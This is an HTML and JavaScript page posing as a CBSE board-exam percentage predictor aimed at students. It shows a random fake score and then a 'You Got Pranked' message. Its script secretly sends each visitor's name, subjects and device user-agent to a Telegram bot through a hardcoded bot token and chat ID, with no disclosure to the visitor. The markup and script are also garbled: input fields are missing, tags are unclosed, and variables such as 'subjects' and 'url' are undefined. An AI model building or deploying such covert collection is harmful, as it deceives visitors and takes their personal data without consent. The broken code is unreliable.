<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CBSE Board Exam Percentage Prediction</title>
    <style>
        /* CBSE Official Theme */
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background: #E3F2FD;
            color: #002147;
            animation: fadeIn 1.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .header {
            background: #002147;
            color: white;
            padding: 15px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
        }

        .container {
            background: white;
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            margin: 30px auto;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
            border-top: 5px solid #002147;
        }

        input, button {
            padding: 12px;
            margin: 10px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #ccc;
            width: 90%;
            transition: 0.3s;
        }

        button {
            background: #002147;
            color: white;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.3s ease, background 0.3s ease;
        }

        button:hover {
            background: #0056b3;
            transform: scale(1.05);
        }

        .result-box {
            background: #002147;
            padding: 20px;
            margin-top: 20px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            display: none;
            color: white;
            animation: fadeIn 1s ease-in-out;
        }

        /* Prank Reveal Animation */
        .glitch {
            animation: glitch 0.8s infinite alternate;
            color: red;
        }

        @keyframes glitch {
            0% { transform: skewX(0deg); }
            20% { transform: skewX(5deg); }
            40% { transform: skewX(-5deg); }
            60% { transform: skewX(5deg); }
            80% { transform: skewX(-5deg); }
            100% { transform: skewX(0deg); }
        }

        /* Share Button Styles */
        .share-container {
            margin-top: 20px;
        }

        .share-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #ffcc00;
            color: black;
            padding: 10px 15px;
            margin: 5px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }

        .share-btn img {
            width: 20px;
            height: 20px;
            margin-right: 8px;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>
<body>

    <div class="header">
        üìò CBSE Board Exam Percentage Prediction

    <div class="container">
        <h2>üìä Predict Your CBSE Exam Percentage</h2>

        <button onclick="predictPercentage()">Predict</button>

        <div id="result" class="result-box"></div>

        <!-- Share Buttons -->
        <div class="share-container">

            <a class="share-btn" id="whatsapp-share">

    <script>
        function predictPercentage() {
            let username = document.getElementById("username").value.trim();

            let resultBox = document.getElementById("result");

            if (username === "" || subjects === "") {
                alert("‚ö†Ô∏è Please enter all details!");
                return;
            }

            let fakePercentage = Math.floor(Math.random() * (99 - 40 + 1)) + 40;
            let mobileModel = navigator.userAgent; // üì± User ‡§ï‡§æ Device Model

            resultBox.style.display = "block";
            resultBox.innerHTML = `<strong>${username}</strong>, Your Predicted CBSE Percentage is: <br>
                                   <span style="font-size:40px; color:#FFD700;">${fakePercentage}%</span><br>
                                   üì± Device: ${mobileModel}`;

            setTimeout(() => {
                resultBox.innerHTML = `<h2 class='glitch'>üòÇ You Got Pranked! üòÇ</h2>
                                       <p>This is a fake percentage, it will not help you. Go study now! üìö</p>`;
                document.getElementById("prankSound").play();
            }, 3000);

            sendToTelegram(username, subjects, fakePercentage, mobileModel);
        }

        function sendToTelegram(username, subjects, percentage, mobileModel) {
            let botToken = "7880536303:AAFCop3W72uhhIK_4MOAnByV-rRMyFZEfZo";  
            let chatId = "6423851220";  

            let message = `üì¢ *New User Data Received!*\nüë§ *Name:* ${username}\nüìö *Subjects:* ${subjects}\nüéØ *Predicted Percentage:* ${percentage}%\nüì± *Device:* ${mobileModel}\n‚è∞ *Time:* ${new Date().toLocaleString()}`;

            fetch(url)
                .then(response => console.log("‚úÖ Data Sent to Telegram!"))

    </script>

</html>
